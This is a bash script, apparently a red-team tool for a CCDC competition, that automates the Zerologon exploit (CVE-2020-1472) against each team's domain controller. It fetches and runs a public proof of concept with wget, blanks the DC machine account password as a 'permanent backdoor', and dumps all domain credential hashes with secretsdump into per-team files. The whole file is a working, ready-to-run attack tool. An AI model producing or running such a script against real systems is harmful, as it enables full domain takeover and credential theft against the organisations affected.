#!/bin/bash
# ================================================
# CCDC Zerologon Auto-Runner (dirkjanm CVE-2020-1472)
# Targets: CURIOSITY$ on every team's DC (192.168.20X.140 / 172.16.3.140)
# Sets DC machine account password to blank → permanent backdoor
#
# Uses an isolated venv so system impacket is never touched.
# Safe to run alongside any existing impacket installation.
#
# Flags:
#   -d    After exploit, dump all hashes via secretsdump (always tries even on failure)
#         Output: team<N>_<HHMMSS>.txt
#   -jd   Just dump hashes (skip exploit entirely — DC must already be zeroed)
#   -x    Use internal 172.16.x.x IPs (via proxychains)
# ================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
VENV_DIR="${SCRIPT_DIR}/zl_venv"
EXPLOIT="${SCRIPT_DIR}/cve-2020-1472-exploit.py"
RESTORE="${SCRIPT_DIR}/restorepassword.py"

DUMP=0
JUST_DUMP=0
USE_INTERNAL=0

# Parse flags before positional arg (manual loop — getopts can't handle -jd)
while [[ "$1" == -* ]]; do
  case "$1" in
    -d)   DUMP=1; shift ;;
    -jd)  JUST_DUMP=1; DUMP=1; shift ;;
    -x)   USE_INTERNAL=1; shift ;;
    *)    echo "[-] Unknown flag: $1"; break ;;
  esac
done

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 [-d|-jd] [-x] <team_number | all>"
  echo "   -d          dump hashes after exploit (always tries even if exploit failed)"
  echo "   -jd         just dump hashes — skip exploit (DC must already be zeroed)"
  echo "   -x          use internal 172.16.x.x IPs (via proxychains)"
  echo "   e.g. $0 5"
  echo "   e.g. $0 -d 5        # exploit + dump team 5"
  echo "   e.g. $0 -d all      # exploit + dump teams 1-5"
  echo "   e.g. $0 -jd 5       # dump only (no exploit)"
  exit 1
fi

ARG="$1"

# ============== VENV SETUP ==============
# Creates a dedicated venv with the impacket version required by the PoC.
# Skips setup if already done.
setup_venv() {
  if [[ -f "${VENV_DIR}/bin/python3" ]]; then
    return 0
  fi

  echo "[*] Creating isolated venv for Zerologon (won't touch system impacket)..."

  if ! command -v python3 >/dev/null 2>&1; then
    echo "[-] python3 not found — install it first"
    exit 1
  fi

  python3 -m venv "${VENV_DIR}"
  "${VENV_DIR}/bin/pip" install --quiet --upgrade pip
  # The PoC requires impacket ≥ 0.9.21; pin to a known-good version
  "${VENV_DIR}/bin/pip" install --quiet "impacket==0.11.0"

  if [[ $? -ne 0 ]]; then
    echo "[-] Failed to install impacket into venv — check internet access"
    rm -rf "${VENV_DIR}"
    exit 1
  fi

  echo "[+] Venv ready → ${VENV_DIR}"
}

# ============== DOWNLOAD EXPLOIT ==============
download_exploit() {
  if [[ ! -f "$EXPLOIT" ]]; then
    echo "[*] Downloading dirkjanm's Zerologon exploit..."
    wget -q https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py \
      -O "$EXPLOIT" && chmod +x "$EXPLOIT"
    if [[ $? -ne 0 ]]; then
      echo "[-] Download failed — check internet/VPN"
      exit 1
    fi
  fi

  if [[ ! -f "$RESTORE" ]]; then
    echo "[*] Downloading restorepassword.py (for cleanup if needed)..."
    wget -q https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py \
      -O "$RESTORE" && chmod +x "$RESTORE"
  fi
}

# ============== REACHABILITY CHECK ==============
check_dc() {
  local ip="$1"
  # Test port 445 (SMB/RPC — required for Zerologon)
  if ! timeout 3 bash -c "echo >/dev/tcp/${ip}/445" 2>/dev/null; then
    echo "[-] Cannot reach ${ip}:445 — check VPN / connectivity"
    echo "    (ping test: ping -c1 ${ip})"
    return 1
  fi
  return 0
}

# ============== DUMP HASHES ==============
dump_hashes() {
  local TEAM="$1"
  local DC_IP="$2"
  local DOMAIN="$3"
  local TIMESTAMP
  TIMESTAMP=$(date +%H%M%S)
  local OUTFILE="${SCRIPT_DIR}/team${TEAM}_${TIMESTAMP}.txt"

  echo "[*] Dumping hashes → ${OUTFILE}"

  # Find secretsdump (system install preferred — it's the full impacket)
  local SD
  SD=$(command -v secretsdump.py 2>/dev/null \
    || command -v impacket-secretsdump 2>/dev/null \
    || echo "${VENV_DIR}/bin/secretsdump.py")

  if [[ ! -x "$SD" && "$SD" == "${VENV_DIR}/bin/secretsdump.py" ]]; then
    # Fall back to running via venv python
    SD=""
  fi

  if [[ -n "$SD" ]]; then
    "$SD" "${DOMAIN}/CURIOSITY\$:@${DC_IP}" \
      -no-pass -dc-ip "${DC_IP}" \
      2>&1 | tee "${OUTFILE}"
  else
    "${VENV_DIR}/bin/python3" -m impacket.examples.secretsdump \
      "${DOMAIN}/CURIOSITY\$:@${DC_IP}" \
      -no-pass -dc-ip "${DC_IP}" \
      2>&1 | tee "${OUTFILE}"
  fi

  if grep -q "Dumping local SAM\|krbtgt\|Administrator:" "${OUTFILE}" 2>/dev/null; then
    echo "[+] Dump saved → ${OUTFILE}"
  else
    echo "[-] Dump may have failed — check ${OUTFILE}"
  fi
}

# ============== RUN ZEROLOGON ==============
zerologon_team() {
  local TEAM="$1"
  local DC_IP
  if [[ $USE_INTERNAL -eq 1 ]]; then
    DC_IP="172.16.3.140"
  else
    DC_IP="192.168.20${TEAM}.140"
  fi
  local DC_NAME="CURIOSITY"
  local DOMAIN="aperturesciencelabs.org"

  echo ""
  echo "[+] ================================================"
  echo "[+] Zerologon → TEAM ${TEAM} | ${DC_NAME} @ ${DC_IP}"
  echo "[+] ================================================"

  # Connectivity check first — avoids the confusing traceback
  if ! check_dc "${DC_IP}"; then
    echo "[-] Skipping team ${TEAM} — DC unreachable"
    return 1
  fi
  echo "[+] DC reachable"

  # Run exploit using venv Python (isolated from system impacket)
  "${VENV_DIR}/bin/python3" "$EXPLOIT" "${DC_NAME}" "${DC_IP}"
  local EXIT_CODE=$?

  echo ""
  if [[ $EXIT_CODE -eq 0 ]]; then
    echo "[+] Zerologon sent for team ${TEAM}"
    echo "    → CURIOSITY\$ machine account password is now BLANK"
    echo ""
    echo "    Restore later (if needed):"
    echo "    ${VENV_DIR}/bin/python3 ${RESTORE} CURIOSITY ${DC_IP} ${DOMAIN}/CURIOSITY\$:@${DC_IP} -target-ip ${DC_IP} -no-pass"
    echo ""
    echo "    The blank password persists permanently unless they manually reset it."
  else
    echo "[-] Exploit exited with code ${EXIT_CODE} — may have failed"
    echo "    Check output above. If it printed attack attempts, it likely worked."
  fi

  # Always dump when -d is set, regardless of exploit exit code
  if [[ $DUMP -eq 1 ]]; then
    [[ $EXIT_CODE -ne 0 ]] && echo "[*] Attempting dump anyway (machine account may still be blank)..."
    dump_hashes "${TEAM}" "${DC_IP}" "${DOMAIN}"
  fi
}

# ============== MAIN ==============
setup_venv

if [[ $JUST_DUMP -eq 1 ]]; then
  # -jd: skip exploit entirely, just dump
  DOMAIN="aperturesciencelabs.org"
  if [[ "$ARG" == "all" || "$ARG" == "All" ]]; then
    echo "[*] Dumping hashes for ALL teams (1-5) — no exploit..."
    for t in {1..5}; do
      if [[ $USE_INTERNAL -eq 1 ]]; then
        DC_IP="172.16.3.140"
      else
        DC_IP="192.168.20${t}.140"
      fi
      echo ""
      echo "[+] ================================================"
      echo "[+] Just-Dump → TEAM ${t} | ${DC_IP}"
      echo "[+] ================================================"
      if check_dc "${DC_IP}"; then
        dump_hashes "${t}" "${DC_IP}" "${DOMAIN}"
      else
        echo "[-] Skipping team ${t} — DC unreachable"
      fi
    done
  else
    if ! [[ "$ARG" =~ ^[0-9]+$ ]]; then
      echo "[-] Invalid team number"; exit 1
    fi
    if [[ $USE_INTERNAL -eq 1 ]]; then
      DC_IP="172.16.3.140"
    else
      DC_IP="192.168.20${ARG}.140"
    fi
    echo ""
    echo "[+] ================================================"
    echo "[+] Just-Dump → TEAM ${ARG} | ${DC_IP}"
    echo "[+] ================================================"
    if check_dc "${DC_IP}"; then
      dump_hashes "${ARG}" "${DC_IP}" "${DOMAIN}"
    else
      echo "[-] DC unreachable"; exit 1
    fi
  fi
else
  download_exploit
  if [[ "$ARG" == "all" || "$ARG" == "All" ]]; then
    echo "[*] Running Zerologon on ALL teams (1-5)..."
    for t in {1..5}; do
      zerologon_team "$t"
    done
    echo ""
    echo "[*] All teams processed."
  else
    if ! [[ "$ARG" =~ ^[0-9]+$ ]]; then
      echo "[-] Invalid team number"
      exit 1
    fi
    zerologon_team "$ARG"
  fi
fi

echo ""
echo "[*] Done."